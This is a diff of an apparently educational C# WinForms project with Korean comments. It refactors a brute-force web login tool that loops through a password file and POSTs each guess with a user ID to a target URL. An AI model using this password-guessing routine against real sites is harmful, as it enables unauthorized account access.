@@ -1,5 +1,5 @@
 ﻿using System;
-using System.Collections;
+//using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -10,13 +10,17 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-
+/*
+위와 동일한 프로그램이나 ArrayList를 List로 수정하였다
+*/
 /*
 [웹 자동 로그인]
 #개요
  - 과거 아이디와 비밀번호를 알아내기 위해 사용되던 해킹 프로그램을 간략화한 예제
  - 보안에 취약한 예전 홈페이지 해킹에 많이 사용
  - 홈페이지에 아이디를 입력하고 무작위의 비밀번호를 계속 대입하며 비밀번호를 찾는다
+   (비밀번호는 프로젝트의 pwdExample 폴더 안에 있다)
+   (프로그램 아이콘은 img 폴더 안에 있다)
 
 #과정
  1. 웹서버 구축
@@ -73,17 +77,17 @@ using System.Windows.Forms;
 */
 namespace mook_BruteForceLogin
 {
-    public partial class Form1 : Form
+    public partial class Form1_fix : Form
     {
         //private List<string> listPassword = new List<string>(); //ArrayList는 구세대 제네릭이므로 List 사용
                                                                   //음 아니다 생각해보니 일부러 이렇게 해 놨을수도 있으니 나중에 다 보고 수정해야지
-        private ArrayList ArrayPassword = new ArrayList();
+        private List<string> listPassword = new List<string>();
         int status = 3; //비밀번호를 찾는 FindPassword 스레드의 상태를 관리하는 플래그 변수
         Thread FindPassword = null; //외부 스레드로 비밀번호 찾는 작업 수행
         private delegate void FindPASSDelegate(string strText); //델리게이트 클래스의 개체 선언, 외부스레드에서 비밀번호를 찾았을 때
         private FindPASSDelegate FindPASS = null;               //메세지를 나타내기 위한 구문
 
-        public Form1()
+        public Form1_fix()
         {
             InitializeComponent();
         }
@@ -100,7 +104,7 @@ namespace mook_BruteForceLogin
                     string pass = sr.ReadLine(); //무작위로 작성된 비밀번호를 한줄한줄 읽어
                     if (pass == null)
                         break;
-                    ArrayPassword.Add(pass); //컬렉션에 저장
+                    listPassword.Add(pass); //컬렉션에 저장
                 }
                 sr.Close();
             }
@@ -110,7 +114,7 @@ namespace mook_BruteForceLogin
         //비밀번호 찾기 위한 외부 스레드 생성
         private void tlsbtnRun_Click(object sender, EventArgs e)
         {
-            if (ArrayPassword.Count > 0)
+            if (listPassword.Count > 0)
             {
                 FindPASS = new FindPASSDelegate(MessageView);
                 this.tlstxtAddress.Enabled = false;
@@ -129,7 +133,7 @@ namespace mook_BruteForceLogin
         {
             this.tlstxtAddress.Enabled = true; //비밀번호 찾는 작업이 끝났으므로 입력컨트롤 활성화
             this.tlstxtId.Enabled = true;
-            ArrayPassword.Clear(); 
+            listPassword.Clear(); 
             MessageBox.Show("비밀번호 : " + strText, "알림", MessageBoxButtons.OK, MessageBoxIcon.Information);
             FindPassword.Abort();
         }
@@ -137,9 +141,9 @@ namespace mook_BruteForceLogin
         //외부 스레드에서 수행되어 비밀번호를 찾는 작업 수행
         private void ThreadFindPwd()
         {
-            foreach(object PWD in ArrayPassword) //반복적으로 웹페이지에 아뒤와 비번을 대입하며 찾는다
+            foreach(string PWD in listPassword) //반복적으로 웹페이지에 아뒤와 비번을 대입하며 찾는다
             {
-                byte[] postData = Encoding.Default.GetBytes("userid=" + this.tlstxtId.Text + "&userpw=" + PWD.ToString()); //byte 배열로 아이디와 비밀번호 인코딩
+                byte[] postData = Encoding.Default.GetBytes("userid=" + this.tlstxtId.Text + "&userpw=" + PWD); //byte 배열로 아이디와 비밀번호 인코딩
                 this.WebBrowser.Navigate(this.tlstxtAddress.Text, null, postData, "Content-Type: application/x-www-form-urlencoded"); //url주소와 byte배열의 아뒤 비번을 넣어 이동
                 //WebBrower.Navigate() : 지정된 주소로 이동한다
                 #region WebBroser.Navigate 메소드 설명
